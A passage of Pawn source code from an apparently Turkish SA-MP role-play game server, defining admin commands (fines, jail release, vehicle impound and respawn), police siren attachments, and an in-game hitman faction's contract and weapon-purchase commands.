	if(sscanf(params, "uds[64]", giveplayerid, percentage, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /pfine [Oyuncu ID/Ýsim] [percentage] [sebep]");

	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(IsPlayerConnected(giveplayerid))
		{
			new fine, allmoney;

			if(PlayerInfo[giveplayerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[giveplayerid][pHouse]][hOwner], true) == 0)
			{
				allmoney = HouseInfo[PlayerInfo[giveplayerid][pHouse]][hSafeMoney]+GetPlayerCash(giveplayerid)+PlayerInfo[giveplayerid][pBank];
			}
			else if(PlayerInfo[giveplayerid][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[giveplayerid][pHouse2]][hOwner], true) == 0)
			{
				allmoney += HouseInfo[PlayerInfo[giveplayerid][pHouse2]][hSafeMoney];
			}
			else
			{
				allmoney = GetPlayerCash(giveplayerid)+PlayerInfo[giveplayerid][pBank];
			}
			if(allmoney < 1)
			{
				SendClientMessage(giveplayerid, COLOR_GRAD2, "Bu oyuncunun hiç parasý yok!");
				return 1;
			}

			fine = percentage*allmoney/100;
			if(percentage < 1 || percentage > 100)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Miktar 0-100 arasý olmalý.");
				return 1;
			}
			format(string, sizeof(string), "AdminKomutu: %s tarafýndan $%d para cezasýna çarptýrýldý, sebep: %s", GetPlayerNameEx(giveplayerid), fine, GetPlayerNameEx(playerid), reason);
			Log("logs/admin.log", string);
			format(string, sizeof(string), "AdminKomutu: %s tarafýndan $%d para cezasýna çarptýrýldý, sebep: %s", GetPlayerNameEx(giveplayerid), fine, GetPlayerNameEx(playerid), reason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, string);
			punishmentLog(giveplayerid, playerid, 3, string, reason);
			GivePlayerCash(giveplayerid, -fine);
			return 1;
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "Level 3 Admin deðilsin.");
	}
	return 1;
}

CMD:takeadminweapons(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /takeadminweapons [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			for(new s = 0; s < 12; s++)
			{
				if(PlayerInfo[giveplayerid][pAGuns][s] != 0)
				{
					RemovePlayerWeapon(giveplayerid, PlayerInfo[giveplayerid][pAGuns][s]);
				}
			}
			format(string,sizeof(string),"%s kiþisinin admin tarafýndan çýkarýlmýþ silahlarýný sildin.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	return 1;
}

CMD:deletead(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 3) {
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");

		new
		    iTarget;

		if(sscanf(params, "u", iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /deletead [Oyuncu ID/Ýsim]");

		if(iTarget == INVALID_PLAYER_ID)
		    return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

		if(!isnull(szAdvert[iTarget])) {
		    strdel(szAdvert[iTarget], 0, strlen(szAdvert[iTarget]));
		    szAdvert[iTarget][0] = 0; // never can remember if it actually sets it to the null terminator

		    new
		        szMessage[64];

			format(szMessage, sizeof(szMessage), "%s kiþisinin reklamýný reklam sisteminden kaldýrdýn.", GetPlayerNameEx(iTarget));
			SendClientMessage(playerid, COLOR_WHITE, szMessage);

			format(szMessage, sizeof(szMessage), "%s senin reklamýný reklam sisteminden kaldýrdý.", GetPlayerNameEx(playerid));
			SendClientMessage(iTarget, COLOR_WHITE, szMessage);
		} else return SendClientMessage(playerid, COLOR_GREY, "Bu reklam mevcut deðil ya da öncelikli reklam.");
	}
	return 1;
}

CMD:sirenkapat(playerid, params[]) {
	if(IsACop(playerid)) {
	    if(IsValidDynamicObject(GetPVarInt(playerid, "SirenO")) && GetPVarInt(playerid, "SirenO") > 0) {
	        DestroyDynamicObject(GetPVarInt(playerid, "SirenO"));
	        DeletePVar(playerid, "SirenO");
	        SendClientMessage(playerid, COLOR_WHITE, "Siren aracýndan kaldýrýldý.");
	    } else SendClientMessage(playerid, COLOR_GREY, "Aracýnda siren yok.");
	} else SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	return 1;
}

CMD:sirenyoket(playerid, params[]) {
	if(IsACop(playerid) && PlayerInfo[playerid][pRank] > 4) {
		new
			szMessage[128];
		foreach(Player, i) {
			if(IsValidDynamicObject(GetPVarInt(i, "SirenO")) && GetPVarInt(i, "SirenO") > 0) {
				DestroyDynamicObject(GetPVarInt(i, "SirenO"));
				DeletePVar(i, "SirenO");
			}
		}
		format(szMessage, sizeof(szMessage), "HQ: Tüm sirenler %s tarafýndan kaldýrýldý.", GetPlayerNameEx(playerid));
		SendRadioMessage(1, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(2, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(3, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(5, TEAM_BLUE_COLOR, szMessage);
	} else SendClientMessage(playerid, COLOR_GREY, "Devlet memuru ya da R4+ deðilsin.");
	return 1;
}

CMD:siren(playerid, params[]) {
	if(IsACop(playerid)) {
	    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			if(IsABoat(GetPlayerVehicleID(playerid)) || IsAPlane(GetPlayerVehicleID(playerid)) || IsABike(GetPlayerVehicleID(playerid)) || IsAHelicopter(GetPlayerVehicleID(playerid)))
				return SendClientMessage(playerid, COLOR_GREY, "Bu tip araçta siren kullanamazsýn.");

			switch(GetVehicleModel(GetPlayerVehicleID(playerid))) {
			    case 416, 523, 427, 490, 528, 407, 544, 601: {
                    SendClientMessage(playerid, COLOR_GREY, "Araçta zaten siren var.");
				}
				case 596, 597, 598, 599: {
					if(IsValidDynamicObject(GetPVarInt(playerid, "SirenO")) && GetPVarInt(playerid, "SirenO") > 0) {
			            DestroyDynamicObject(GetPVarInt(playerid, "SirenO"));
			        }
					SetPVarInt(playerid, "SirenO", CreateDynamicObject(19419, 10.0, 10.0, 10.0, 0, 0, 0, 0, 0, -1));
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 596) AttachDynamicObjectToVehicle(GetPVarInt(playerid, "SirenO"), GetPlayerVehicleID(playerid), 0.000000, -0.379999, 0.889999, 0.000000, 0.000000, 0.000000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 597) AttachDynamicObjectToVehicle(GetPVarInt(playerid, "SirenO"), GetPlayerVehicleID(playerid), 0.000000, -0.374999, 0.884999, 0.000000, 0.000000, 0.000000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 598) AttachDynamicObjectToVehicle(GetPVarInt(playerid, "SirenO"), GetPlayerVehicleID(playerid), 0.000000, -0.334498, 0.933500, 0.000000, 0.000000, 0.000000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 599) AttachDynamicObjectToVehicle(GetPVarInt(playerid, "SirenO"), GetPlayerVehicleID(playerid), 0.000000, 0.039999, 1.153999, 0.000000, 0.000000, 0.000000);
					else return SendClientMessage(playerid, COLOR_GREY, "Bu tip araçta siren kullanamazsýn.");
			        SendClientMessage(playerid, COLOR_WHITE, "Siren takýldý.");
				}
			    default: {
			        if(IsValidDynamicObject(GetPVarInt(playerid, "SirenO")) && GetPVarInt(playerid, "SirenO") > 0) {
			            DestroyDynamicObject(GetPVarInt(playerid, "SirenO"));
			        }
					SetPVarInt(playerid, "SirenO", CreateDynamicObject(18646, 10.0, 10.0, 10.0, 0, 0, 0, 0, 0, -1));
			        AttachDynamicObjectToVehicle(GetPVarInt(playerid, "SirenO"), GetPlayerVehicleID(playerid), -0.43, 0.0, 0.785, 0.0, 0.1, 0.0);
			        SendClientMessage(playerid, COLOR_WHITE, "Siren takýldý.");
			    }
			}
	    } else SendClientMessage(playerid, COLOR_GREY, "Siren takabilmek için aracýn þoförü olman gerekir.");
	} else SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	return 1;
}

CMD:takeweapons(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /takeadminweapons [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			ResetPlayerWeaponsEx(giveplayerid);
			format(string,sizeof(string),"%s kiþisinin silahlarýný sildin.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	return 1;
}

CMD:sendtols(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /sendtols [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] >= PlayerInfo[playerid][pAdmin] && AdminDuty[giveplayerid] == 1)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Bu komutu sana eþit veya daha yüksek leveldeki admin  üzerinde uygulayamazsýn.");
				return 1;
			}
			format(string, sizeof(string), " %s kiþisini Los Santos'a gönderdin.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
			SendClientMessage(giveplayerid, COLOR_WHITE, "Iþýnlandýn!");
			SetPlayerPos(giveplayerid, 1529.6,-1691.2,13.3);
			SetPlayerVirtualWorld(giveplayerid, 0);
			SetPlayerInterior(giveplayerid, 0);
			PlayerInfo[giveplayerid][pInt] = 0;
			PlayerInfo[giveplayerid][pVW] = 0;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:release(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
			string[128],
			giveplayerid,
			reason[64];

		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /release [Oyuncu ID/Ýsim] [sebep]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pJailTime] == 0)
				return SendClientMessage(playerid, COLOR_GRAD1, "Seçtiðin oyuncu hapiste deðil.");

			format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan hapisten býrakýldý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			Log("logs/admin.log", string);
			format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan hapisten býrakýldý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, string);

			if(PlayerDraggedBy[giveplayerid] != INVALID_PLAYER_ID) {
				IsCopDragging[PlayerDraggedBy[giveplayerid]] = INVALID_PLAYER_ID;
				PlayerDragged[giveplayerid] = 0;
				PlayerDraggedBy[giveplayerid] = INVALID_PLAYER_ID;
			}
			PlayerInfo[giveplayerid][pJailed] = 0;
			PlayerInfo[giveplayerid][pWantedLevel] = 0;
			SetPlayerToTeamColor(giveplayerid);
			SetPlayerWantedLevel(giveplayerid, 0);
			PlayerInfo[giveplayerid][pJailTime] = 0;
			SetPlayerPos(giveplayerid, 1529.6,-1691.2,13.3);
			SetPlayerInterior(giveplayerid,0);
			PlayerInfo[giveplayerid][pInt] = 0;
			SetPlayerVirtualWorld(giveplayerid, 0);
			PlayerInfo[giveplayerid][pVW] = 0;
			PhoneOnline[giveplayerid] = 0;
			if(IsPlayerAttachedObjectSlotUsed(giveplayerid, 0))
				RemovePlayerAttachedObject(giveplayerid, 0);
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	} else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:forcedeath(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 		{
  			SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
   		}

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /forcedeath [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(GetPVarInt(giveplayerid, "Injured") == 1)
			{
				format(string, sizeof(string), " %s kiþisini ölmeye zorladýn.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				SendClientMessage(giveplayerid, COLOR_WHITE, "Bir admin tarafýndan ölmeye zorlandýn.");
				KillEMSQueue(giveplayerid);
				ResetPlayerWeaponsEx(giveplayerid);
				SpawnPlayer(giveplayerid);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu yaralý deðil!");
			}
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:forcehospital(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 		{
  			SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
   		}

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /forcehospital [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(GetPVarInt(giveplayerid, "Hospital") > 0)
			{
				format(string, sizeof(string), " %s hastaneden çýkmaya zorladýn.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				SendClientMessage(giveplayerid, COLOR_WHITE, "Admin tarafýndan hastane dýþýna çýkarýldýn.");
				DeletePVar(giveplayerid, "HospitalTimer");
				HospitalSpawn(giveplayerid);
				DeletePVar(giveplayerid, "Hospital");
				DeletePVar(giveplayerid, "DoktorMasrafi");
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu hastanede deðil!");
			}
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:flipveh(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma iznin yok.");

    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	if(IsPlayerInAnyVehicle(playerid))
	{
		new Float:zAngle;
		GetVehicleZAngle(GetPlayerVehicleID(playerid), zAngle);
		SetVehicleZAngle(GetPlayerVehicleID(playerid), zAngle);
		SendClientMessageEx(playerid, COLOR_WHITE, "Aracýn ters çevrildi.");
	}
	else
	{
		SendClientMessageEx(playerid, COLOR_GRAD1, "Bu komutu kullanabilmek için araçta olman gerekiyor.");
	}
	return 1;
}

CMD:reloadpvehicles(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3)
	{
        SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma iznin yok.");
        return 1;
    }
    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
    {
    	SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   }

	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /reloadpvehicles [Oyuncu ID/Ýsim]");

	UnloadPlayerVehicles(giveplayerid);
	LoadPlayerVehicles(giveplayerid);

	format(string, sizeof(string), " %s kiþisinin araçlarýný yeniden çýkardýn.", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_GREY, string);

	return 1;
}

CMD:apark(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 3)
	{
    	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
    	{
    		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
   		}
        foreach(Player, ownerid)
        {
			for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
			{
				if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[ownerid][d][pvId]))
				{
				    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Sürücü koltuðunda olman lazým.");
					new Float:x, Float:y, Float:z, Float:angle, Float:health;
					if(PlayerInfo[playerid][pLockCar] == GetPlayerVehicleID(playerid)) PlayerInfo[playerid][pLockCar] = INVALID_VEHICLE_ID;
					if(IsARC(GetPlayerVehicleID(playerid))) // RC Vehicles
					{
						new Float:vehPos[3];
						GetVehiclePos(GetPlayerVehicleID(playerid),vehPos[0], vehPos[1], vehPos[2]);
						SetPlayerPos(playerid,vehPos[0], vehPos[1]+0.5, vehPos[2]+0.5);
					}
					GetVehicleHealth(PlayerVehicleInfo[ownerid][d][pvId], health);
					GetVehiclePos(PlayerVehicleInfo[ownerid][d][pvId], x, y, z);
					GetVehicleZAngle(PlayerVehicleInfo[ownerid][d][pvId], angle);
					SurfingCheck(GetPlayerVehicleID(playerid));
					UpdatePlayerVehicleParkPosition(ownerid, d, x, y, z, angle, health);
					PutPlayerInVehicle(playerid, GetPlayerVehicleID(playerid), 0);
				 	SetPlayerArmedWeapon(playerid, 0);

				 	new szMessage[128];

				 	format(szMessage, sizeof(szMessage)," %s kiþisinin %s model aracýný park ettin.",GetPlayerNameEx(ownerid), VehicleName[PlayerVehicleInfo[ownerid][d][pvModelId] - 400]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);

					format(szMessage, sizeof(szMessage), "Aracýn %s admin tarafýndan baþka bir yere park edildi. /aracimibul ile bulabilirsin.", VehicleName[PlayerVehicleInfo[ownerid][d][pvModelId] - 400]);
					SendClientMessage(ownerid, COLOR_WHITE, szMessage);
					return 1;
				}
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:aimpound(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
    	{
    		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
   		}

		new
			iVehType,
			iVehIndex,
			iTargetOwner,
			iVehTowed;
        if(sscanf(params, "d", iVehTowed)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /aimpound [carid]");

		foreach(Player, i) {
			iVehIndex = GetPlayerVehicle(i, iVehTowed);
			if(iVehIndex != -1) {
				iVehType = 1;
				iTargetOwner = i;
				break;
			}
		}
		if(!iVehType) {
			for(new i; i < MAX_FAMILY; ++i) {
				iVehIndex = GetGangVehicle(i, iVehTowed);
				if(iVehIndex != -1) {
					iVehType = 2;
					iTargetOwner = i;
					break;
				}
			}
		}
		switch(iVehType) {
			case 0, 2: {
				SendClientMessage(playerid, COLOR_GRAD1, "Bu aracý baðlayamazsýn, onun yerine yeniden çýkarýldý.");
				DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
				SetVehicleToRespawn(iVehTowed);
			}
			case 1: {

				PlayerVehicleInfo[iTargetOwner][iVehIndex][pvImpounded] = 1;
				PlayerVehicleInfo[iTargetOwner][iVehIndex][pvSpawned] = 0;
				PlayerVehicleInfo[iTargetOwner][iVehIndex][pvId] = INVALID_PLAYER_VEHICLE_ID;
				DestroyVehicle(iVehTowed);
				VehicleRadioStation[iVehTowed] = 0;

				VehicleSpawned[iTargetOwner]--;
				--PlayerCars;

				new
					szMessage[96];

				format(szMessage, sizeof(szMessage),"%s kiþisinin %s model aracýný baðladýn.",GetPlayerNameEx(iTargetOwner), VehicleName[PlayerVehicleInfo[iTargetOwner][iVehIndex][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_WHITE, szMessage);

				format(szMessage, sizeof(szMessage), "Aracýn %s admin tarafýndan baðlandý. Dillimore'daki DMV'den arabaný çýkarabilirsin.", VehicleName[PlayerVehicleInfo[iTargetOwner][iVehIndex][pvModelId] - 400]);
				SendClientMessage(iTargetOwner, COLOR_WHITE, szMessage);

			}
		}
		arr_Towing[playerid] = INVALID_VEHICLE_ID;
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:respawncar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], carid;
		if(sscanf(params, "d", carid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /respawncar [carid]");

		SetVehicleToRespawn(carid);
		format(string, sizeof(string), "Aracý çýkardýn( ID %d ).", carid);
		SendClientMessage(playerid, COLOR_GREY, string);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:respawncars(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 3) {
	    if(isnull(params))
	        return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /respawncars [menzil]");

 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], radius = strval(params);

		if(radius < 1 || radius > 40)
			return SendClientMessage(playerid, COLOR_WHITE, "Menzil 0-41 arasý olmalý!");

		RespawnNearbyVehicles(playerid, radius);
		format(string, sizeof(string), "%d menzildeki tüm araçlarý çýkardýn.", radius);
		SendClientMessage(playerid, COLOR_GREY, string);
	} else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");

	return 1;
}

CMD:kontraktlar(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4 || (PlayerInfo[playerid][pAdmin] >= 4 && AdminDuty[playerid] == 1))
	{
        SearchingHit(playerid);
    }
    return 1;
}

CMD:gorevver(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
		if(PlayerInfo[playerid][pRank] < 5)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Sadece Rank 5 ve üstü kontrat verebilir!");
			return 1;
		}

		new string[128], giveplayerid, targetid;
		if(sscanf(params, "uu", giveplayerid, targetid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gorevver [Oyuncu ID/Ýsim] [targetid]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(GoChase[giveplayerid] < 999)
			{
				SendClientMessage(playerid, COLOR_GREY, "   Bu Hitman baþka bir kontratla meþgul!");
				return 1;
			}
			if(GotHit[targetid] == 1)
			{
				SendClientMessage(playerid, COLOR_GREY, "   Bu hedefle zaten baþka bir hitman ilgileniyor!");
				return 1;
			}
			if(IsPlayerConnected(targetid))
			{
				if(PlayerInfo[targetid][pHeadValue] == 0)
				{
					SendClientMessage(playerid, COLOR_GREY, "   Hedef için yapýlmýþ bir kontrat yok!");
					return 1;
				}

				format(string, sizeof(string), "* %s kiþisine %s adlý kiþiyi öldürmesi için kontrat önerdin.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(targetid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Hitman %s, %s adlý kiþiyi öldürmek için sana kontrat önerdi (/kabulet kontrakt ile kabul et).", GetPlayerNameEx(playerid), GetPlayerNameEx(targetid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				HitOffer[giveplayerid] = playerid;
				HitToGet[giveplayerid] = targetid;
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Kontratlý oyuncu online deðil, /kontraktlar kullan!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Hitman online deðil!");
			return 1;
		}
	}
	return 1;
}

CMD:goreval(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
		new string[128], targetid;
		if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /goreval [targetid]");

		if(IsPlayerConnected(targetid))
		{
			if(GoChase[playerid] < 999)
			{
				SendClientMessage(playerid, COLOR_GREY, "    Baþka bir kontratla meþgulsun!");
				return 1;
			}
			if(GotHit[targetid] == 1)
			{
				SendClientMessage(playerid, COLOR_GREY, "   Baþka bir hitman bu hedefe görevlendirilmiþ!");
				return 1;
			}
			if(PlayerInfo[targetid][pHeadValue] == 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "    Hedef için kontrat yapýlmamýþ!");
				return 1;
			}
			format(string, sizeof(string), "* %s kiþisini öldürmek için kendine kontrat verdin. ( /kabulet contract)", GetPlayerNameEx(targetid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			HitOffer[playerid] = playerid;
			HitToGet[playerid] = targetid;
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Kontratlý oyuncu online deðil, /kontraktlar kullan!");
			return 1;
		}
	}
	return 1;
}

CMD:siparis(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
	    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Þu an bunu yapamazsýn.");
		if(IsPlayerInRangeOfPoint(playerid, 20.0, 1236.112182, -751.863220, 5080.765136))
		{
			if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Silah taþýman yasaklandýðýndan dolayý bunu kullanamazsýn!");
			new Hitman[32], skin = -1;
			if(sscanf(params, "s[32]D", Hitman, skin))
			{
				SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /siparis [isim]");
				SendClientMessage(playerid, COLOR_GRAD2, " Rütbe 1: Knife ($80), SDPistol ($100), Shotgun ($150), Skin ($250), Deagle ($500), MP5 ($250), Kevlar Vest ($600)");
				SendClientMessage(playerid, COLOR_GRAD2, " Rütbe 2: Rifle ($300), AK47 ($1,000), M4 ($1,200)");
				SendClientMessage(playerid, COLOR_GRAD2, " Rütbe 3: SPAS12 ($3,500), Sniper ($3,500)");
				SendClientMessage(playerid, COLOR_GRAD2, " Rütbe 4: C4 ($5000)");
				return 1;
			}
			else if(strcmp(Hitman,"skin",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1) {
					SendClientMessage(playerid, COLOR_GREY, "Bunun için yeterli rütben yok!");
				}
				else if(IsInvalidSkin(skin)) {
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /siparis skin [skin ID]");
				}
				else if(GetPlayerCash(playerid) >= 250) {
					SetPlayerSkin(playerid, skin);
					PlayerInfo[playerid][pSkin] = skin;
					GivePlayerCash(playerid, -250);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"Bir skin satýn aldýn!");
				}
				else SendClientMessage(playerid, COLOR_GREY,"   Bunu ödeyemezsin!");
			}
			else if(strcmp(Hitman,"Knife",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 80)
				{
					GivePlayerValidWeapon(playerid, 4, 3);
					GivePlayerCash(playerid, -80);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir knife satýn aldýn!");
					return 1;
				}
				else
				{
